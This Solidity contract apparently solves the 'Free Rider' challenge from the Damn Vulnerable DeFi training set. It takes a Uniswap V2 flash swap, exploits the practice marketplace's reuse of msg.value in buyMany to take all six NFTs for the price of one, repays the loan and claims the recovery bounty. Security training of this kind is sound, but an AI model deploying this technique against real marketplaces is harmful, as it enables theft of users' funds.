// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {DamnValuableNFT} from "../../DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery} from "../FreeRiderRecovery.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "solmate/src/tokens/WETH.sol";

contract FreeRider is IUniswapV2Callee, IERC721Receiver, Ownable {
    DamnValuableNFT immutable nft;
    FreeRiderNFTMarketplace immutable marketplace;
    FreeRiderRecovery immutable recovery;
    IUniswapV2Pair immutable pair;
    WETH immutable weth;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT = 6;
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(address _nft, address payable _marketplace, address _recovery, address _pair, address payable _weth)
        payable
    {
        nft = DamnValuableNFT(_nft);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = FreeRiderRecovery(_recovery);
        pair = IUniswapV2Pair(_pair);
        weth = WETH(_weth);
    }

    receive() external payable {}

    function flashLoan() external onlyOwner {
        uint256 flashLoanAmount = NFT_PRICE;
        bytes memory data = abi.encode(flashLoanAmount);
        pair.swap(flashLoanAmount, 0, address(this), data);
    }

    function uniswapV2Call(address sender, uint256 amount0Out, uint256, bytes calldata) external {
        require(msg.sender == address(pair), "Only UniswapV2Pair");
        require(sender == address(this), "Only this");

        // unwrap WETh
        weth.withdraw(amount0Out);

        // buy many NFTs
        marketplace.buyMany{value: amount0Out}(tokenIds);

        // repay flashloan with 0.3% fee
        // x = 1,003 * 15 = 15,045
        uint256 fee = amount0Out * 3 / 997 + 1;
        uint256 repayAmount = (amount0Out + fee);

        weth.deposit{value: repayAmount}();
        weth.transfer(msg.sender, repayAmount);
    }

    function recoverNft() external {
        bytes memory data = abi.encode(owner());
        for (uint256 i; i < AMOUNT; i++) {
            nft.safeTransferFrom(address(this), address(recovery), tokenIds[i], data);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
